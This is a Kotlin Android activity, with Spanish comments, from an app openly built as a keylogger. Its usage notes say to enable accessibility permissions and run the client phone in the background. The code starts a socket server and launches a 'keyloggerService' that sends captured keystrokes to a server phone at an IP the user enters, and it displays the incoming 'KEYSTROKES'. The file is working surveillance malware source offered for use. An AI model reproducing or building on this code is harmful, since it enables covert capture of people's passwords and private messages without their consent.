package com.example.socket

import MyServerSocket
import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.localbroadcastmanager.content.LocalBroadcastManager

//Guia de uso
//Activar en accesibility los permisos de accesibilidad de la aplicacion
// El telefono servidor no puede cerrarse se coloca su ip respectivo en el input IP
// El telefono cliente se conecta al ip del telefono servidor colocandolo en el input IP
// El telefono cliente puede trabajar en segundo plano y trabajar
// Para ver los mensajes metete en el logcat y busca el filtro package:mine

class MainActivity : AppCompatActivity() {
    private lateinit var outputMessage: TextView

    private val keyloggerReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val keystrokes = intent?.getStringExtra("KEYSTROKES")
            keystrokes?.let {
                runOnUiThread {
                    outputMessage.append("\n$it") // Agregar el nuevo texto sin borrar el anterior
                }
            }
        }
    }

    @SuppressLint("WrongViewCast")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Inicialización correcta del TextView
        outputMessage = findViewById(R.id.outputMessage)
        val inputIp: EditText = findViewById(R.id.inputIp)
        val buttonConnect: Button = findViewById(R.id.buttonConnect)

        buttonConnect.setOnClickListener {
            Thread {
                MyServerSocket().startServer()
            }.start()

            val ip = inputIp.text.toString()
            if (ip.isEmpty()) {
                Toast.makeText(this, "Por favor, ingresa una IP", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            startKeyloggerService(ip)
        }

        // Registrar el BroadcastReceiver
        LocalBroadcastManager.getInstance(this).registerReceiver(
            keyloggerReceiver, IntentFilter("KEYLOGGER_UPDATE")
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        // Desregistrar el BroadcastReceiver para evitar memory leaks
        LocalBroadcastManager.getInstance(this).unregisterReceiver(keyloggerReceiver)
    }

    private fun startKeyloggerService(ip: String) {
        val intent = Intent(this, keyloggerService::class.java)
        intent.putExtra("SERVER_IP", ip)  // Pasar la IP como extra en el Intent
        startService(intent) // Iniciar servicio
        Toast.makeText(this, "Servicio de keylogger iniciado", Toast.LENGTH_SHORT).show()
    }
}